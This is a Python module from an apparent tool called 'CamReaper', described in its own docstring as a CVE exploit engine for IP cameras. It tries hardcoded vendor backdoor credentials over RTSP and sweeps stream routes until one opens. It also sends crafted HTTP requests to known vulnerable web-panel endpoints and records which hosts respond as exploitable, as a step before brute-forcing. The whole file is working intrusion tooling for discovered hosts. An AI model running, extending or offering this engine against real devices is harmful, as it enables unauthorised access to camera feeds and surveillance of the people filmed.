"""CVE exploit engine for IP camera scanning.

Loads a CVE database and applies vendor-specific exploits (backdoor credentials
and HTTP probes) against discovered hosts.  Designed to plug into the scanner's
three-stage pipeline as a lightweight pre-brute-force stage.

Exploit types
-------------
* ``backdoor_creds``: vendor-specific hardcoded credentials tried via RTSP
  DESCRIBE (reuses the existing auth machinery).
* ``http_probe``: HTTP GET/POST requests against known vulnerable endpoints;
  a pattern match in the response indicates the CVE is exploitable.
"""

import asyncio
import contextlib
import http.client
import json
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from CamReaper.report import record_cve_test
from CamReaper.rtsp import RTSPClient
from CamReaper.scanner import probe_first_open_route, try_auth

DB_PATH = Path(__file__).parent / "cve_db.json"

# Ports that serve HTTPS by convention (web panels rarely use the RTSP ones).
_HTTPS_PORTS = (443, 8443)
# Cap on a probe response: a camera panel is never bigger than this, and an
# unbounded read would let a hostile host eat the scanner's memory.
_MAX_BODY = 256 * 1024
# Fallback web-panel ports when a caller does not pass its own list.
DEFAULT_HTTP_PORTS = (80, 443, 8080)
# Route list used when no route list is supplied (matches the shipped defaults).
FALLBACK_ROUTES = (
    "/",
    "/0/1:1/main",
    "/3",
    "/4",
    "/cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif",
    "/h264/ch1/main/av_stream",
    "/h264/ch1/sub/av_stream",
    "/main/av_stream",
    "/stream1",
    "/superstream",
    "/user=admin&password=&channel=1&stream=0.sdp?",
)


@dataclass
class CVEEntry:
    id: str
    vendor: str
    type: str  # "backdoor_creds" | "http_probe"
    description: str
    severity: str
    credentials: list = field(default_factory=list)
    url_path: str = ""
    method: str = "GET"
    content_type: str = ""
    content: str = ""
    success_patterns: list = field(default_factory=list)


class CVEDatabase:
    """In-memory CVE database loaded from a JSON file."""

    def __init__(self, db_path: Optional[Path] = None):
        self.entries: list[CVEEntry] = []
        self.by_vendor: dict[str, list[CVEEntry]] = {}
        self.skipped: int = 0
        self._load(db_path or DB_PATH)

    def _load(self, path: Path) -> None:
        if not path.exists():
            return
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            return
        if not isinstance(data, dict):
            return
        for item in data.get("cves", []):
            # A single malformed record must not take the whole database (and
            # with it every --mode cve run) down with a KeyError traceback.
            if not isinstance(item, dict):
                self.skipped += 1
                continue
            try:
                entry = CVEEntry(
                    id=item["id"],
                    vendor=item["vendor"],
                    type=item["type"],
                    description=item.get("description", ""),
                    severity=item.get("severity", "medium"),
                    credentials=item.get("credentials", []),
                    url_path=item.get("url_path", ""),
                    method=item.get("method", "GET"),
                    content_type=item.get("content_type", ""),
                    content=item.get("content", ""),
                    success_patterns=item.get("success_patterns", []),
                )
            except (KeyError, TypeError, AttributeError):
                self.skipped += 1
                continue
            self.entries.append(entry)
            self.by_vendor.setdefault(entry.vendor, []).append(entry)

    def get_for_vendor(self, vendor: str) -> list:
        return self.by_vendor.get(vendor, [])

    def get_all_creds(self, vendor: str = None) -> list:
        """Collect all backdoor_creds CVEs for a vendor (or all vendors)."""
        creds = []
        entries = self.by_vendor.get(vendor, []) if vendor else self.entries
        for e in entries:
            if e.type == "backdoor_creds":
                creds.extend(e.credentials)
        return creds


def _url_for(ip: str, port: int, path: str) -> str:
    """Build the probe URL for one web-panel port."""
    scheme = "https" if port in _HTTPS_PORTS else "http"
    host = ip if port in (80, 443) else f"{ip}:{port}"
    return f"{scheme}://{host}{path}"


def _read_body(response) -> str:
    """Read at most ``_MAX_BODY`` bytes from a response-like object."""
    try:
        return response.read(_MAX_BODY).decode("utf-8", errors="replace")
    except Exception:
        return ""


def _error_body(exc) -> str:
    """Body of an :class:`urllib.error.HTTPError`, read *before* closing it.

    ``HTTPError.close()`` closes the underlying file object, so reading after
    the close silently yields an empty body - which is exactly the body a
    vulnerable panel uses to answer 403/404.
    """
    body = _read_body(exc)
    with contextlib.suppress(Exception):
        exc.close()
    return body


async def _http_request(
    ip: str, port: int, path: str, method: str = "GET",
    content_type: str = "", content: str = "", timeout: float = 5.0,
) -> str:
    """Perform an HTTP request in a thread (urllib is blocking).

    Returns the response body as a string, or empty string on failure.  The
    body of a 4xx/5xx answer is returned too: a vulnerable panel usually says
    "403 Forbidden" *and* hands out the config file, so dropping the body of
    every non-200 answer would hide most of the CVEs this engine looks for.
    """
    url = _url_for(ip, port, path)

    def _do() -> str:
        headers = {"User-Agent": "Mozilla/5.0"}
        if content_type:
            headers["Content-Type"] = content_type
        req = urllib.request.Request(
            url, data=content.encode() if content else None,
            headers=headers, method=method,
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return _read_body(resp)
        except urllib.error.HTTPError as exc:
            return _error_body(exc)
        except (urllib.error.URLError, OSError, ValueError, http.client.HTTPException):
            return ""

    return await asyncio.to_thread(_do)


async def find_backdoor_stream(
    client: RTSPClient, entry: CVEEntry, route_parallel: int = 8,
    routes=None,
) -> Optional[tuple]:
    """Try backdoor credentials from a CVE entry via RTSP.

    Returns ``(credential, route)`` for the first working combination, or None.
    Every attempt uses a fresh RTSPClient so the caller's socket is untouched.
    """
    ip, port, timeout = client.ip, client.port, client.timeout
    route_list = list(routes) if routes else list(FALLBACK_ROUTES)
    for cred in entry.credentials:
        probe = RTSPClient(ip, port, timeout, cred)
        try:
            if not await probe.connect():
                continue
            code, _ = await try_auth(probe, cred, "/")
            if code == "200":
                return cred, "/"
            if code == "404":
                # Valid creds, wrong route - sweep routes for a working one.
                found_route = await probe_first_open_route(
                    ip, port, timeout, route_list, cred, route_parallel,
                )
                if found_route:
                    return cred, found_route
        except Exception:
            pass
        finally:
            probe.close()
    return None


async def try_backdoor_creds(
    client: RTSPClient, entry: CVEEntry, route_parallel: int = 8,
) -> Optional[str]:
    """Backdoor credentials only: returns the working ``user:pass`` or None."""
    hit = await find_backdoor_stream(client, entry, route_parallel)
    return hit[0] if hit else None


async def try_http_probe(
    ip: str, port: int, entry: CVEEntry, timeout: float = 5.0,
) -> bool:
    """Try an HTTP-based CVE probe. Returns True if pattern matched."""
    body = await _http_request(
        ip, port, entry.url_path, entry.method,
        entry.content_type, entry.content, timeout,
    )
    if not body:
        return False
    body = body.lower()
    return any(p.lower() in body for p in entry.success_patterns)


async def run_cve_stage(
    ip: str,
    live: RTSPClient,
    vendor: str,
    cve_db: CVEDatabase,
    route_parallel: int = 8,
    http_timeout: float = 5.0,
    stats: dict = None,
    http_ports=None,
    routes=None,
) -> list:
    """Run all CVE exploits for a detected vendor against one host.

    ``backdoor_creds`` entries are tried over RTSP and, when one opens, the
    confirmed route is returned.  ``http_probe`` entries are sent to the web
    panel (``http_ports``) - never to the RTSP port, which would simply answer
    RTSP and score a bogus FAIL for every entry.

    Returns a list of Found streams: confirmed RTSP streams (from
    ``backdoor_creds``) plus ``is_http_cve`` markers for web-panel hits.  Only
    the former is a reason to stop scanning the host.
    """
    from CamReaper.scanner import Found

    entries = cve_db.get_for_vendor(vendor)
    if not entries:
        return []

    found = []
    stream_hit = False
    for entry in entries:
        if stream_hit:
            break
        if entry.type == "backdoor_creds":
            if stats is not None:
                stats["cve_tested"] = stats.get("cve_tested", 0) + 1
            hit = await find_backdoor_stream(live, entry, route_parallel, routes)
            if hit:
                cred, route = hit
                await record_cve_test(ip, live.port, entry.id, True)
                found.append(Found(
                    ip=ip, port=live.port, route=route,
                    credentials=cred, vendor=vendor,
                ))
                # Confirmed stream - no need to probe further CVEs for this host.
                stream_hit = True
            else:
                await record_cve_test(ip, live.port, entry.id, False)

        elif entry.type == "http_probe":
            for hport in (http_ports or DEFAULT_HTTP_PORTS):
                if stats is not None:
                    stats["cve_tested"] = stats.get("cve_tested", 0) + 1
                try:
                    ok = await try_http_probe(ip, hport, entry, http_timeout)
                except Exception:
                    ok = False
                await record_cve_test(ip, hport, entry.id, ok)
                if ok:
                    # The panel is vulnerable, but it gives us no RTSP
                    # credentials: report it without claiming a stream.
                    found.append(Found(
                        ip=ip, port=hport, route=entry.url_path,
                        credentials="", vendor=vendor,
                        is_http_cve=True, cve_id=entry.id,
                    ))

    return found


async def probe_http_host(
    ip: str,
    port: int,
    cve_db: CVEDatabase,
    timeout: float = 5.0,
    stats: dict = None,
) -> list:
    """Probe one HTTP/HTTPS port for CVE exploits on a host's web panel.

    Fetches the root page to fingerprint the vendor (from the ``Server`` header
    and a peek of the body), then runs every applicable ``http_probe`` CVE for
    that vendor (plus any generic http_probe CVEs).
    Returns a list of Found entries flagged as HTTP CVE hits.
    """
    from CamReaper.scanner import Found
    from CamReaper.vendor import detect_vendor_http

    # Fingerprint via a lightweight root GET (Server header + a peek of body).
    def _root() -> tuple:
        try:
            with urllib.request.urlopen(_url_for(ip, port, "/"), timeout=timeout) as resp:
                server = resp.headers.get("Server", "") or ""
                return server, _read_body(resp)
        except urllib.error.HTTPError as exc:
            server = exc.headers.get("Server", "") if exc.headers else ""
            return server, _error_body(exc)
        except (urllib.error.URLError, OSError, ValueError, http.client.HTTPException):
            return "", ""

    server_header, body = await asyncio.to_thread(_root)
    if not body and not server_header:
        return []
    if stats is not None:
        stats["http_checked"] = stats.get("http_checked", 0) + 1

    vendor = detect_vendor_http(server_header, body)

    # Candidate entries: vendor-specific for the detected vendor, plus any
    # Generic http_probe entries (vendor-agnostic endpoints).
    entries = list(cve_db.get_for_vendor(vendor))
    if vendor != "Generic":
        entries += cve_db.get_for_vendor("Generic")
    entries = [e for e in entries if e.type == "http_probe"]
    if not entries:
        return []

    found = []
    for entry in entries:
        if stats is not None:
            stats["cve_tested"] = stats.get("cve_tested", 0) + 1
        try:
            ok = await try_http_probe(ip, port, entry, timeout)
        except Exception:
            ok = False
        await record_cve_test(ip, port, entry.id, ok)
        if ok:
            found.append(Found(
                ip=ip, port=port, route=entry.url_path,
                credentials="", vendor=vendor,
                is_http_cve=True, cve_id=entry.id,
            ))
    return found
